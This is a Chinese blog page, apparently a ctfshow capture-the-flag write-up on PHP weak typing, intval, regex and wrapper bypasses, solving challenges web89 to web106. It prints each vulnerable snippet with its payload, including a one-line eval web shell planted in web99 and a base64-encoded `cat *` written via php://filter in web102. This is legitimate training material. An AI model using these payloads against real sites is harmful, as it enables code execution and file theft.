@@ -1,0 +1,1092 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/my-avatar.png">
+  <link rel="icon" href="/img/my-avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#eef5fa">
+  <meta name="author" content="Xendr1a">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ctfshow PHP 特性专题：从 web89 起记录弱类型、intval 与正则绕过。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow PHP 特性题解">
+<meta property="og:url" content="https://xendr1a.github.io/2025/07/15/ctfshow-php/index.html">
+<meta property="og:site_name" content="Xendr1a的小窝">
+<meta property="og:description" content="ctfshow PHP 特性专题：从 web89 起记录弱类型、intval 与正则绕过。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xendr1a.github.io/img/ctfshow-php/img-01.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/ctfshow-php/img-02.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/ctfshow-php/img-03.png">
+<meta property="og:image" content="https://xendr1a.github.io/img/ctfshow-php/img-04.png">
+<meta property="article:published_time" content="2025-07-15T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-27T07:41:34.958Z">
+<meta property="article:author" content="Xendr1a">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="ctfshow">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xendr1a.github.io/img/ctfshow-php/img-01.png">
+  
+  
+  
+  <title>ctfshow PHP 特性题解 - Xendr1a的小窝</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom-soft.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xendr1a.github.io","root":"/","version":"1.9.9","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"¶"},"progressbar":{"enable":true,"height_px":2,"color":"#6f9cba","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 55vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xendr1a的小窝</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">ctfshow PHP 特性题解</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-15 10:00" pubdate>
+          2025年7月15日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          32k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ctfshow PHP 特性题解</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><p>intval 转换数组类型时 不关心数组中的内容 ，只判断数组中有没有元素，可以使用数组绕过,数组为空返回0，否则返回1 所以输入?num[]&#x3D;1即可</p>
+<p><img src="/img/ctfshow-php/img-01.png" alt="d645cd1b-da4c-4642-b3a1-88fb1f895970-20250302223936-81499aa"></p>
+<h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><p>我想到的是进制绕过,因为intval支持进制转换所以我用的8进制010574，方法挺多的</p>
+<p><img src="/img/ctfshow-php/img-02.png" alt="08ab6567-54fc-4524-970b-be9144db1c78-20250302224446-r81x5ee"></p>
+<h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>show_source(__FILE__);<br>include(&#x27;flag.php&#x27;);<br>$a=$_GET[&#x27;cmd&#x27;];<br>if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;<br>    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;<br>        echo &#x27;hacker&#x27;;<br>    &#125;<br>    else&#123;<br>        echo $flag;<br>    &#125;<br>&#125;<br>else&#123;<br>    echo &#x27;nonononono&#x27;;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>观查一下可以发现一个是‘&#x2F;im’，一个是‘&#x2F;i’，i（忽略大小写）和m（多行模式），那我们就要锁定一下这个差异了，如果第一个通过，第二个不通过就可以获得flag，我们可以利用这个多行模式，构造payload:?cmd&#x3D;%0aphp</p>
+<h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>include(&quot;flag.php&quot;);<br>highlight_file(__FILE__);<br>if(isset($_GET[&#x27;num&#x27;]))&#123;<br>    $num = $_GET[&#x27;num&#x27;];<br>    if($num==4476)&#123;<br>        die(&quot;no no no!&quot;);<br>    &#125;<br>    if(intval($num,0)==4476)&#123;<br>        echo $flag;<br>    &#125;else&#123;<br>        echo intval($num,0);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>if(intval($num,0)&#x3D;&#x3D;4476),这个函数的作用是 将$num的值转化成十进制整数,那我们可以用小数来构造payload</p>
+<p>得到?num&#x3D;4476.1     当然也可以用进制转换</p>
+<h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>include(&quot;flag.php&quot;);<br>highlight_file(__FILE__);<br>if(isset($_GET[&#x27;num&#x27;]))&#123;<br>    $num = $_GET[&#x27;num&#x27;];<br>    if($num==4476)&#123;<br>        die(&quot;no no no!&quot;);<br>    &#125;<br>    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;<br>        die(&quot;no no no!&quot;);<br>    &#125;<br>    if(intval($num,0)==4476)&#123;<br>        echo $flag;<br>    &#125;else&#123;<br>        echo intval($num,0);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>同上题可以用小数和进制转换，过滤了a-z的大小写,所以二进制的0b和16进制的0x不能用,只能用8进制</p>
+<p>payload:num&#x3D;010574</p>
+<h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>include(&quot;flag.php&quot;);<br>highlight_file(__FILE__);<br>if(isset($_GET[&#x27;num&#x27;]))&#123;<br>    $num = $_GET[&#x27;num&#x27;];<br>    if($num==4476)&#123;<br>        die(&quot;no no no!&quot;);<br>    &#125;<br>    if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;<br>        die(&quot;no no no!!&quot;);<br>    &#125;<br>    if(!strpos($num, &quot;0&quot;))&#123;<br>        die(&quot;no no no!!!&quot;);<br>    &#125;<br>    if(intval($num,0)===4476)&#123;<br>        echo $flag;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>与上题相比过滤了’.’,但是仔细观察可以发现我们可以根据web91的换行来绕过，当然了为了保证传入的数据有0这边还需要进制转换一下payload:?num&#x3D;%0a010574</p>
+<h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br><br>if(isset($_GET[&#x27;u&#x27;]))&#123;<br>    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;<br>        die(&quot;no no no&quot;);<br>    &#125;else&#123;<br>        highlight_file($_GET[&#x27;u&#x27;]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>运用php伪协议读取，payload:?u&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p>看了一下wp发现还有另一种解法，官方wp：在linux下面表示当前目录是 .&#x2F; 所以我们的payload： u&#x3D;.&#x2F;flag.php</p>
+<h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>include(&quot;flag.php&quot;);<br>highlight_file(__FILE__);<br>if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;<br>if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])<br>if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))<br>echo $flag;<br>else<br>print &#x27;Wrong.&#x27;;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>对a和b没什么要求那我们可以直接用数组绕过</p>
+<h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>include(&quot;flag.php&quot;);<br>$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;<br>$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;<br>$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;<br>highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>分析一下代码，主要就是让HTTP_FLAG&#x3D;flag传入，但是上面有许多的三元判断语句，</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">_GET?_GET=&amp;$_POST:&#x27;flag&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p>如果 <code>$_GET</code> 存在（即请求包含 GET 参数），则将 <code>$_GET</code> 指向 <code>$_POST</code> 的引用就会把post当作get处理（我是这样理解的</p>
+<p>然后看看中间两行，我们只想获得<code>$flag</code>的话好像用不上</p>
+<p>所以get传啥都行，而post需要为HTTP_FLAG&#x3D;flag</p>
+<h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>$allow = array();<br>for ($i=36; $i &lt; 0x36d; $i++) &#123; <br>    array_push($allow, rand(1,$i));<br>&#125;<br>if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;<br>    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>in_array()函数的弱比较漏洞，如果没有设置第三个参数，in_array() 函数在比较时默认是弱类型比较，这意味着它会进行自动类型转换。例如数组中的元素是整数，而搜索的值是字符串，PHP 会尝试将字符串转换为整数来进行比较。就比如说传入1.php,它就会认为只传入了1</p>
+<p>而代码检测传入是是否为1到i的数字，因此我们可以构造</p>
+<p>payload：get:?n&#x3D;1 post:content&#x3D;<?=eval($_REQUEST['1'])?> 然后就可以进入1.php查找flag了</p>
+<h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>include(&quot;ctfshow.php&quot;);<br>//flag in class ctfshow;<br>$ctfshow = new ctfshow();<br>$v1=$_GET[&#x27;v1&#x27;];<br>$v2=$_GET[&#x27;v2&#x27;];<br>$v3=$_GET[&#x27;v3&#x27;];<br>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);<br>if($v0)&#123;<br>    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;<br>        if(preg_match(&quot;/\;/&quot;, $v3))&#123;<br>            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);<br>        &#125;<br>    &#125;<br>    <br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>审计一下代码，就是说v1要是数字(因为&#x3D;的优先级比and高，所以我们只需要符合v1是数字就行，后面是干扰的)，然后呢v2不能出现；而v3需要出现；</p>
+<p>v2和v3的中间还有个<code>(&#39;ctfshow&#39;)</code>，那我们拼接语句的话可以试试把他给注释掉，没啥过滤咱就可以直接写命令了</p>
+<p>payload：?v1&#x3D;1&amp;v2&#x3D;var_dump($ctfshow)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p>
+<p><strong>print_r和var_dump都行（能输出多个值）</strong></p>
+<h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>$v1 = $_POST[&#x27;v1&#x27;];<br>$v2 = $_GET[&#x27;v2&#x27;];<br>$v3 = $_GET[&#x27;v3&#x27;];<br>$v4 = is_numeric($v2) and is_numeric($v3);<br>if($v4)&#123;<br>    $s = substr($v2,2);<br>    $str = call_user_func($v1,$s);<br>    echo $str;<br>    file_put_contents($v3,$str);<br>&#125;<br>else&#123;<br>    die(&#x27;hacker&#x27;);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这题有点难啊，先补充一下知识</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">substr() 字符串截取<br><br>call_user_func() 调用方法或变量,第一个参数是调用的对象，第二个参数是被调用对象的参数<br><br>file_put_contents() 用来写文件进去，第一个参数是文件名，第二个参数是需要写进文件中的内容 文件名支持伪协议<br></code></pre></td></tr></table></figure>
+
+<p>审计一下代码，就是说v2得是个数，并且进入if条件后v2的前两个值会被删除，v1与v3我们都可以控制，v3我们写入文件名，一般写入我们就能联想到php伪协议，然后v1写入方法，我们这样思路就有了，先加密v2为数字，然后用v1还原然后用v3写入，但是payload我没构造出来，也许是php7的原因我没弄成功（事实证明确实是这个问题，php7环境并不认为0x是一个数字）</p>
+<p>看看官方wp的payload:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">GET<br>v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-<br>decode/resource=2.php<br>POST<br>v1=hex2bin    /*最后查看一下2.php源码就能看到了*/<br></code></pre></td></tr></table></figure>
+
+<p>v2去掉前面两个11后是这个PD89YGNhdCAqYDs，base64后为&lt;?&#x3D;<code>cat *</code>;</p>
+<p>引用一下大佬写的过程</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">v3=php://filter/write=convert.base64-decode/resource=2.php v2:写进2.php的内容 ——&gt; 查看当前页面源码；&lt;?=cat *; ——&gt; 转为base64为PD89YGNhdCAqYDs ——&gt;转为16进制的ascii码为5044383959474e6864434171594473——&gt;绕过截断，在前面随意加两位数字225044383959474e6864434171594473 v1：将数字字符串还原为base64码 ——&gt; hex2bin<br></code></pre></td></tr></table></figure>
+
+<h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><p>加了一个过滤但是web102的发法依然可以过</p>
+<h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>include(&quot;flag.php&quot;);<br><br>if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;<br>    $v1 = $_POST[&#x27;v1&#x27;];<br>    $v2 = $_GET[&#x27;v2&#x27;];<br>    if(sha1($v1)==sha1($v2))&#123;<br>        echo $flag;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>弱比较，可以数组绕过</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">其他：<br>aaK1STfY<br>0e76658526655756207688271159624026011393<br>aaO8zKZF<br>0e89257456677279068558073954252716165668<br></code></pre></td></tr></table></figure>
+
+<h3 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>include(&#x27;flag.php&#x27;);<br>error_reporting(0);<br>$error=&#x27;你还想要flag嘛？&#x27;;<br>$suces=&#x27;既然你想要那给你吧！&#x27;;<br>foreach($_GET as $key =&gt; $value)&#123;<br>    if($key===&#x27;error&#x27;)&#123;<br>        die(&quot;what are you doing?!&quot;);<br>    &#125;<br>    $$key=$$value;<br>&#125;foreach($_POST as $key =&gt; $value)&#123;<br>    if($value===&#x27;flag&#x27;)&#123;<br>        die(&quot;what are you doing?!&quot;);<br>    &#125;<br>    $$key=$$value;<br>&#125;<br>if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;<br>    die($error);<br>&#125;<br>echo &quot;your are good&quot;.$flag.&quot;\n&quot;;<br>die($suces);<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>代码审计，get里不能有error，post不能有flag，看到了$$kay&#x3D;$$$value涉及变量覆盖</p>
+<p>构造payload：<code>GET: ?suces=flag POST: error=suces</code>，这就是相互覆盖，</p>
+<p>suces-&gt;flag    error-&gt;suces   die $error（die() 函数输出一条消息，并退出当前脚本）</p>
+<h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>include(&quot;flag.php&quot;);<br><br>if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;<br>    $v1 = $_POST[&#x27;v1&#x27;];<br>    $v2 = $_GET[&#x27;v2&#x27;];<br>    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;<br>        echo $flag;<br>    &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>弱比较数组可绕，也可以碰撞<code>aaO8zKZF</code>以及<code>aaK1STfY</code></p>
